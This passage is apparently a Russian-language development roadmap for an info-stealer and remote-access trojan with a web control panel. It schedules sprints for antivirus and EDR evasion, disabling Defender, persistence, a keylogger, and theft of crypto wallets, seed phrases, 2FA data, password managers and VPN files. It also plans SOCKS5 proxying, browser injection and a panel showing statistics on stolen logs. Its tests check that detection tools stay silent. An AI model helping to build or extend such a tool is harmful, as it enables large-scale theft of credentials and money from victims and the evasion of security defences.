---

### 16.4.6 Session Management (1 день)

**Источник:** nexus-stealer `AccountPanel.tsx:349-400`

**Отслеживание сессий пользователей:**
- Device, OS, browser, IP, location
- Просмотр активных сессий
- Remote terminate конкретной сессии
- Уведомление о новом логине через Telegram

---

### 16.4.7 Public Statistics Page (0.5 дня)

**Создание публичной страницы:**
- `/public/stats` — без авторизации
- Метрики: total sessions, crypto logs %, duplicates %
- Geo distribution (интерактивная карта)
- Настройка видимости через Panel Settings

---

### 16.4.8 API Key Management (1 день)

**API с ключами доступа:**
- `POST /api/keys` — создать ключ (Pro: limited, Team: unlimited)
- `DELETE /api/keys/:id` — отозвать ключ
- Rate limiting per key
- Scope per key (read-only, write, admin)

---

## Testing & Verification Strategy

### Unit Tests (zig build test)
```bash
# Каждый новый модуль должен иметь тесты:
zig build test -Dtarget=x86_64-windows

# Ключевые тесты:
# - stack_spoof: RSP восстановление, корректный NTSTATUS
# - persistence: установка + удаление всех 4 методов
# - keylogger: hook установка, запись нажатий
# - socks5: CONNECT запрос, data pipe
# - vpn: копирование файлов по путям
# - 2fa: LevelDB копирование
# - seed_grabber: regex matches BIP39
```

### Integration Tests
```bash
# 16.1x: EDR evasion suite
zig build run -Dtarget=x86_64-windows
# Проверить: все syscalls работают, антивирус молчит

# 16.2x: Coverage suite
# Запустить на Windows 10/11 VM с установленными VPN/браузерами
# Проверить: все модули собирают данные без крашей

# 16.3x: RAT suite
# SOCKS5: curl --socks5 через Mirage
# Backstage: инжект в Chrome, захват экрана

# 16.4x: Panel suite
go test ./...  # все тесты Go панели
# Проверить: 2FA, IP scoring, API endpoints
```

### EDR/AV Verification
```bash
# Перед мерджем:
# 1. Собрать билд
zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall
# 2. Проверить на VirusTotal (частный сканер)
# 3. Запустить под CrowdStrike/SentinelOne в изолированной среде
# 4. Проверить логи детектирования
```

### Performance Benchmarks
```zig
// Тест производительности (Phase 16)
// - Stack spoofing: измерить overhead на syscall
// - Keylogger: использование CPU при hook
// - SOCKS5: пропускная способность
// - Chunked upload: скорость vs single POST
```

---

## Execution Order

### Sprint 1 (Дни 1-3): Quick Wins
- 16.1.3 Hosts File Poisoning
- 16.1.4 Defender Disable
- 16.1.5 Hosting IP check
- 16.2.10 Extension wallets (+14 IDs)
- 16.2.9 Desktop wallets (+23 paths)

### Sprint 2 (Дни 4-7): Core EDR Bypass
- 16.1.1 Stack Spoofing
- 16.1.6 NTDLL Unhook
- 16.1.7 Keylogger
- 16.1.2 Persistence Multi-Method

### Sprint 3 (Дни 8-12): Coverage — VPN + 2FA + PM
- 16.2.1 VPN clients (18)
- 16.2.2 2FA Authenticators (7)
- 16.2.3 Password Managers (8)
- 16.2.4 Seed Phrase Grabber
- 16.2.5 Yandex Passman

### Sprint 4 (Дни 13-16): Coverage — Discord + Webcam + Messengers
- 16.2.6 App-Bound Flags 1-3
- 16.2.7 Discord billing/gifts
- 16.2.8 Webcam
- 16.2.11 Messengers (+8)

### Sprint 5 (Дни 17-21): RAT Capabilities
- 16.3.1 Reverse Proxy (SOCKS5)
- 16.3.4 Self-Supersede / Agent Update

### Sprint 6 (Дни 22-25): Panel + Polish
- 16.4.1 TOTP 2FA
- 16.4.2 IP Security Scoring
- 16.4.3 In-Panel Documentation
- 16.4.7 Public Statistics
- 16.4.8 API Key Management

### Sprint 7 (Дни 26+): Advanced (P3-P4)
- 16.3.2 Chrome Backstage Injection
- 16.3.3 Multi-Platform Build
- 16.3.5 WASM Plugin Runtime
- 16.4.4 Community Chat
- 16.4.5 Marketplace
- 16.4.6 Session Management

---

## Summary: Total Tasks

| Section | Tasks | Est. Effort | Priority |
|---------|-------|-------------|----------|
| 16.1 Stealer Engine — EDR/AV Bypass | 7 | ~5 days | P0-P1 |
| 16.2 Coverage Expansion — из Intelix | 11 | ~7 days | P1-P2 |
| 16.3 RAT Capabilities — из Overlord | 5 | ~10 days | P1-P4 |
| 16.4 Panel Improvements | 8 | ~5 days | P2-P3 |
| **Total** | **38** | **~25 days** | |
